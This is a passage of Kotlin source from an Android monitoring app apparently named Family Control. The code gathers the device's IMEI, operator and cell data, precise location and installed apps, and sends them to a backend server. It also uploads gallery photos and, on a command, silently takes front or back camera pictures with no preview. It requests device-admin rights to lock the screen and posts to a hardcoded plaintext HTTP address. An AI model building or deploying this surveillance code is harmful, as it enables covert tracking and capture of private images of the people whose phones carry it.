                    val dbm = signalStrength?.cellSignalStrengths?.firstOrNull()?.dbm
                    info.put("signal_strength_dbm", dbm ?: JSONObject.NULL)
                    
                    // Add IMEI and operator info if available (requires READ_PHONE_STATE)
                    try {
                        // This line requires READ_PHONE_STATE permission - already checked above
                        info.put("operator_name", tm.networkOperatorName)
                        
                        // Only add device ID (IMEI) for API levels below 29
                        // For API 29+, we'll have to use alternative identifiers
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            info.put("device_id", tm.deviceId)
                        }
                        
                        // Get cellular network info
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            val cellInfo = tm.allCellInfo
                            if (cellInfo != null && cellInfo.isNotEmpty()) {
                                info.put("cell_info_available", true)
                                
                                // Get network operator info
                                val mcc = tm.networkOperator.substring(0, 3)
                                val mnc = tm.networkOperator.substring(3)
                                info.put("mcc", mcc)
                                info.put("mnc", mnc)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("PhoneState", "Error getting phone state details: ${e.message}")
                    }
                    
                } catch (_: Exception) {
                    info.put("signal_strength_dbm", JSONObject.NULL)
                }
    
                getLocationAndUpload(context, info)
                tm.listen(this, PhoneStateListener.LISTEN_NONE)
            }
        }
    
        tm.listen(listener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
    }

    private fun getLocationAndUpload(context: Context, info: JSONObject) {
        val fused = LocationServices.getFusedLocationProviderClient(context)
    
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Log.i("LocationInfo", "ACCESS_FINE_LOCATION permission granted, getting location")
            fused.lastLocation
                .addOnSuccessListener { loc ->
                    if (loc != null) {
                        info.put("latitude", loc.latitude)
                        info.put("longitude", loc.longitude)
                        Log.i("LocationInfo", "Location data added to info: ${loc.latitude}, ${loc.longitude}")
                    } else {
                        Log.w("LocationInfo", "Location is null")
                        info.put("location_available", false)
                    }
                    uploadInformation(context, info)
                }
                .addOnFailureListener { e ->
                    Log.e("LocationInfo", "Failed to get location: ${e.message}")
                    info.put("location_error", e.message)
                    uploadInformation(context, info)
                }
        } else {
            Log.w("LocationInfo", "ACCESS_FINE_LOCATION permission not granted")
            info.put("location_permission", "denied")
            uploadInformation(context, info)
            
            // If this is the main activity, request the permission
            if (context is MainActivity) {
                ActivityCompat.requestPermissions(
                    context,
                    arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
                    context.LOCATION_PERMISSION_CODE
                )
            }
        }
    }
    

    private fun uploadGalleryImages(context: Context) {
        val galleryDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera")
        if (!galleryDir.exists() || !galleryDir.isDirectory) {
            Log.e("UploadGallery", "DCIM/Camera directory not found")
            return
        }
    
        val files = galleryDir.listFiles { file ->
            file.isFile && file.extension.lowercase() in listOf("jpg", "jpeg", "png")
        } ?: return
    
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        val uploadUrl = "${ApiConfig.BASE_URL}/api/device/upload_gallery_image"
    
        val client = OkHttpClient()
    
        for (file in files.take(10)) { // Limit to avoid bulk upload
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart(
                    "image", file.name,
                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()
    
            val request = Request.Builder()
                .url(uploadUrl)
                .post(body)
                .build()
    
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("UploadGallery", "Failed: ${e.message}")
                }
    
                override fun onResponse(call: Call, response: Response) {
                    Log.i("UploadGallery", "Uploaded ${file.name}: ${response.code}")
                }
            })
        }
    }
    

    private fun getInstalledAppsAndUpload() {
        try {
            val packageManager = applicationContext.packageManager
            val packages = packageManager.getInstalledApplications(0)
            val appsJson = JSONArray()
            
            for (appInfo in packages) {
                val appJson = JSONObject()
                appJson.put("package_name", appInfo.packageName)
                appJson.put("app_name", appInfo.loadLabel(packageManager).toString())
                appJson.put("is_system_app", (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                appsJson.put(appJson)
            }
    
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val jsonBody = JSONObject().apply {
                put("device_id", androidId)
                put("apps", appsJson)
            }
    
            val body = jsonBody.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("${ApiConfig.BASE_URL}/api/device/installed_apps?device_id=$androidId")
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build()
    
            OkHttpClient().newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("SendInstalledApps", "Failed to send apps: ${e.message}")
                }
    
                override fun onResponse(call: Call, response: Response) {
                    val body = response.body?.string()
                    if (response.isSuccessful) {
                        Log.i("SendInstalledApps", "Success: $body")
                    } else {
                        Log.e("SendInstalledApps", "Error ${response.code}: $body")
                    }
                }
            })
    
        } catch (e: Exception) {
            Log.e("SendInstalledApps", "Error: ${e.message}", e)
        }
    }
    

    // Permission launcher for POST_NOTIFICATIONS
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted: Boolean ->
        if (isGranted) {
            Log.d("NotificationDebug", "POST_NOTIFICATIONS permission granted")
            
            // Show pending notification if exists
            pendingNotification?.let { (title, message) ->
                Log.d("NotificationDebug", "Permission granted, showing pending notification: $title")
                // Show the notification with a slight delay to ensure permission is fully processed
                Handler(Looper.getMainLooper()).postDelayed({
                    showNotificationAfterPermissionCheck(title, message)
                }, 300)
                pendingNotification = null
            }
        } else {
            Log.d("NotificationDebug", "POST_NOTIFICATIONS permission denied")
            Toast.makeText(
                this,
                "Notification permission denied. Some features will not work properly.",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    /**
     * Checks if the POST_NOTIFICATIONS permission is granted for Android 13+
     */
    private fun checkNotificationPermission(): Boolean {
        Log.d("NotificationDebug", "Checking notification permission")
        val isAndroid13OrAbove = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
        Log.d("NotificationDebug", "Is Android 13 or above: $isAndroid13OrAbove")
        
        if (isAndroid13OrAbove) {
            val permissionGranted = ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
            
            Log.d("NotificationDebug", "POST_NOTIFICATIONS permission granted: $permissionGranted")
            return permissionGranted
        } else {
            // For devices below Android 13, permission is granted at install time
            Log.d("NotificationDebug", "Below Android 13, permission assumed granted")
            return true
        }
    }

    /**
     * Requests the POST_NOTIFICATIONS permission for Android 13+
     */
    private fun requestNotificationPermission(title: String = "", message: String = "") {
        Log.d("NotificationDebug", "Request notification permission called with title: $title, message: $message")
        
        // Store notification details if provided
        if (title.isNotEmpty() && message.isNotEmpty()) {
            pendingNotification = Pair(title, message)
            Log.d("NotificationDebug", "Stored pending notification: $title, $message")
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Log.d("NotificationDebug", "Android 13+ - proceeding with permission request")
            
            val shouldShowRationale = ActivityCompat.shouldShowRequestPermissionRationale(
                this,
                Manifest.permission.POST_NOTIFICATIONS
            )
            Log.d("NotificationDebug", "Should show rationale: $shouldShowRationale")
            
            if (shouldShowRationale) {
                // Explain why the permission is needed
                runOnUiThread {
                    Toast.makeText(
                        this,
                        "Notification permission is required to send you important alerts.",
                        Toast.LENGTH_LONG
                    ).show()
                }
            }
            
            Log.d("NotificationDebug", "Launching permission request")
            // Make sure this runs on the UI thread
            runOnUiThread {
                Log.d("NotificationDebug", "Running permission launcher on UI thread")
                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        } else {
            Log.d("NotificationDebug", "Below Android 13 - no need to request permission")
            
            // If we have pending notification and don't need permission on this Android version,
            // show it immediately
            if (pendingNotification != null) {
                val (storedTitle, storedMessage) = pendingNotification!!
                pendingNotification = null
                showNotificationAfterPermissionCheck(storedTitle, storedMessage)
            }
        }
    }

    /**
     * Checks if notifications are enabled at the system level
     */
    private fun areNotificationsEnabled(): Boolean {
        Log.d("NotificationDebug", "Checking if notifications are enabled at system level")
        val enabled = NotificationManagerCompat.from(this).areNotificationsEnabled()
        Log.d("NotificationDebug", "Notifications enabled at system level: $enabled")
        return enabled
    }

    /**
     * Opens notification settings for the app
     */
    private fun openNotificationSettings() {
        returningFromSettings = true
        Log.d("NotificationDebug", "Setting returningFromSettings flag to true")
        
        val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            }
        } else {
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
        }
        startActivity(intent)
    }

    /**
     * Shows a dialog to guide the user to notification settings
     */
    private fun showNotificationSettingsDialog() {
        Log.d("NotificationDebug", "Showing notification settings dialog")
        
        // Using a simple Toast for now, but could be replaced with a proper dialog or Snackbar
        runOnUiThread {
            Log.d("NotificationDebug", "Displaying toast on UI thread")
            Toast.makeText(
                this,
                "Notifications are disabled for this app. Please enable them in Settings to receive alerts.",
                Toast.LENGTH_LONG
            ).show()
            
            // Open notification settings after a short delay
            Handler(Looper.getMainLooper()).postDelayed({
                Log.d("NotificationDebug", "Opening notification settings")
                openNotificationSettings()
            }, 1000)
        }
    }

    // Function to show notification without permission checks (to be called after checks are done)
    private fun showNotificationAfterPermissionCheck(title: String, message: String) {
        Log.d("NotificationDebug", "Showing notification after permission check: Title=$title, Message=$message")
        
        val channelId = "family_control_channel"
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d("NotificationDebug", "Creating notification channel: $channelId")
            val channel = NotificationChannel(
                channelId,
                "Family Control Alerts",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Channel for Family Control alerts and notifications"
                enableLights(true)
                enableVibration(true)
            }
            notificationManager.createNotificationChannel(channel)
        }
    
        val builder = NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
    
        Log.d("NotificationDebug", "Building notification with title: $title and message: $message")
        
        try {
            val notificationId = System.currentTimeMillis().toInt()
            notificationManager.notify(notificationId, builder.build())
            Log.d("NotificationDebug", "NotificationManager.notify() called with ID: $notificationId")
        } catch (e: Exception) {
            Log.e("NotificationDebug", "Error showing notification: ${e.message}", e)
        }
    }
    
    private fun showNotification(title: String, message: String) {
        Log.d("NotificationDebug", "========================================")
        Log.d("NotificationDebug", "showNotification called with Title: $title, Message: $message")
        
        // Check notification permission for Android 13+
        Log.d("NotificationDebug", "About to check notification permission")
        val permissionGranted = checkNotificationPermission()
        Log.d("NotificationDebug", "Permission check result: $permissionGranted")
        
        if (!permissionGranted) {
            Log.d("NotificationDebug", "Notification permission not granted, requesting with notification data")
            requestNotificationPermission(title, message)
            return
        }
        
        // Check if notifications are enabled at the system level
        Log.d("NotificationDebug", "About to check if notifications are enabled at system level")
        val notificationsEnabled = areNotificationsEnabled()
        Log.d("NotificationDebug", "Notifications enabled check result: $notificationsEnabled")
        
        if (!notificationsEnabled) {
            Log.d("NotificationDebug", "Notifications disabled at system level, showing settings dialog")
            // Store notification data for potential retry
            pendingNotification = Pair(title, message)
            showNotificationSettingsDialog()
            return
        }
        
        Log.d("NotificationDebug", "All checks passed, proceeding with notification creation")
        showNotificationAfterPermissionCheck(title, message)
    }
    
    private fun registerActivityLifecycleCallbacks() {
        Log.d("NotificationDebug", "Registering activity lifecycle callbacks")
        
        application.registerActivityLifecycleCallbacks(object : android.app.Application.ActivityLifecycleCallbacks {
            override fun onActivityCreated(activity: android.app.Activity, savedInstanceState: Bundle?) {}
            override fun onActivityStarted(activity: android.app.Activity) {}
            
            override fun onActivityResumed(activity: android.app.Activity) {
                // Check if we're returning from settings
                if (activity == this@MainActivity && returningFromSettings) {
                    Log.d("NotificationDebug", "Activity resumed after returning from settings")
                    returningFromSettings = false
                    
                    // Check if notifications are now enabled
                    if (areNotificationsEnabled()) {
                        Log.d("NotificationDebug", "Notifications are now enabled, showing pending notification")
                        pendingNotification?.let { (title, message) ->
                            Log.d("NotificationDebug", "Showing pending notification after returning from settings: $title")
                            Handler(Looper.getMainLooper()).postDelayed({
                                showNotificationAfterPermissionCheck(title, message)
                                pendingNotification = null
                            }, 500)
                        }
                    } else {
                        Log.d("NotificationDebug", "Returned from settings but notifications still disabled")
                    }
                }
            }
            
            override fun onActivityPaused(activity: android.app.Activity) {}
            override fun onActivityStopped(activity: android.app.Activity) {}
            override fun onActivitySaveInstanceState(activity: android.app.Activity, outState: Bundle) {}
            override fun onActivityDestroyed(activity: android.app.Activity) {}
        })
    }

    private fun takePhotoAndUpload(cameraFacing: String, uploadUrl: String) {
        val cameraSelector = if (cameraFacing == "front") {
            CameraSelector.DEFAULT_FRONT_CAMERA
        } else {
            CameraSelector.DEFAULT_BACK_CAMERA
        }
    
        val imageCapture = ImageCapture.Builder()
            .setTargetRotation(Surface.ROTATION_0)
            .build()
    
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            val preview = Preview.Builder().build().also {
                it.setSurfaceProvider(null) // no preview
            }
    
            val outputOptions = ImageCapture.OutputFileOptions.Builder(
                File.createTempFile("photo_", ".jpg", cacheDir)
            ).build()
    
            cameraProvider.unbindAll()
            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
    
            imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onError(exc: ImageCaptureException) {
                        Log.e("TakePhoto", "Capture failed: ${exc.message}")
                    }
    
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        val file = output.savedUri?.let { uri ->
                            File(uri.path ?: return)
                        } ?: return
                        uploadFileToBackend(file, uploadUrl)
                    }
                }
            )
        }, ContextCompat.getMainExecutor(this))
    }

    // Implementation of uploadInformation method
    private fun uploadInformation(context: Context, info: JSONObject) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        // Create a wrapper JSON object with the expected format
        val wrapper = JSONObject()
        wrapper.put("device_id", androidId)
        wrapper.put("information", info)  // Use "information" field name and pass the actual JSONObject
        
        Log.d("UploadInfo", "Sending device info: ${wrapper}")
        
        val body = wrapper.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        
        val request = Request.Builder()
            .url("${ApiConfig.BASE_URL}/api/device/information")
            .post(body)
            .addHeader("Content-Type", "application/json")
            .build()
            
        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("UploadInfo", "Failed to upload device information: ${e.message}")
            }
            
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("UploadInfo", "Device information uploaded successfully")
                } else {
                    Log.e("UploadInfo", "Error uploading device information: ${response.code}")
                }
            }
        })
    }
    
    private fun uploadFileToBackend(file: File, uploadUrl: String) {
        try {
            // Log original file size
            val originalFileSize = file.length()
            Log.i("UploadPhoto", "Original image size: $originalFileSize bytes")

            // Create compressed image file
            val compressedFile = compressImage(file)
            
            // Log compressed file size
            val compressedFileSize = compressedFile.length()
            Log.i("UploadPhoto", "Compressed image size: $compressedFileSize bytes (${(compressedFileSize * 100 / originalFileSize)}%)")

            // Get device ID
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            
            // Create the JSON payload with the required structure
            val payloadJson = """
                {
                    "device_id": "$androidId",
                    "command": "take_photo",
                    "params": {
                        "camera": "front",
                        "upload_url": "http://20.20.20.55:8080/api/device/upload_photo"
                    }
                }
            """.trimIndent()

            // Log the payload for debugging
            Log.i("UploadPhoto", "Payload JSON: $payloadJson")
            
            // Create RequestBody for the JSON part with explicit Content-Type
            val jsonRequestBody = payloadJson.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                // Add the JSON RequestBody as a part with null filename for non-file parts
                .addFormDataPart("payload_json", null, jsonRequestBody)
                .addFormDataPart("photo", compressedFile.name, compressedFile.asRequestBody("image/jpeg".toMediaType()))
                .build()
        
            val request = Request.Builder()
                .url(uploadUrl)
                .post(requestBody)
                .build()
        
            OkHttpClient().newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e("UploadPhoto", "Failed: ${e.message}")
                }
        
                override fun onResponse(call: Call, response: Response) {
                    Log.i("UploadPhoto", "Success: ${response.body?.string()}")
                }
            })
        } catch (e: Exception) {
            Log.e("UploadPhoto", "Error compressing/uploading image: ${e.message}", e)
        }
    }

    /**
     * Compresses an image file and returns the compressed file
     */
    private fun compressImage(imageFile: File): File {
        // Decode the image file to a Bitmap
        val options = BitmapFactory.Options()
        options.inPreferredConfig = Bitmap.Config.RGB_565 // Use RGB_565 for smaller size
        
        var bitmap = BitmapFactory.decodeFile(imageFile.absolutePath, options)
        
        // Resize the bitmap if it's too large
        val maxWidth = 1920
        val maxHeight = 1080
        val width = bitmap.width
        val height = bitmap.height
        
        if (width > maxWidth || height > maxHeight) {
            val scaleWidth = maxWidth.toFloat() / width
            val scaleHeight = maxHeight.toFloat() / height
            val scale = scaleWidth.coerceAtMost(scaleHeight)
            
            val matrix = android.graphics.Matrix()
            matrix.postScale(scale, scale)
            
            bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true)
        }
        
        // Create a compressed output file
        val outputFile = File(cacheDir, "compressed_${System.currentTimeMillis()}.jpg")
        val outputStream = FileOutputStream(outputFile)
        
        // Compress the bitmap to JPEG with 80% quality
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, outputStream)
        
        outputStream.flush()
        outputStream.close()
        
        // Recycle bitmap to free memory
        bitmap.recycle()
        
        return outputFile
    }

    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app needs device admin permission to lock screen, monitor usage, etc.")
        }
        startActivityForResult(intent, 1003)
    }

    private fun showWarningUI(context: Context, message: String, shouldLock: Boolean = false) {
        val intent = Intent(context, WarningActivity::class.java).apply {
            putExtra("message", message)
            putExtra("should_lock", shouldLock)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        context.startActivity(intent)
    }
    
    
    
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@ComposePreview(showBackground = true)
@Composable
fun GreetingPreview() {
    FamilyControlAppTheme {
        Greeting("Android")
    }
}
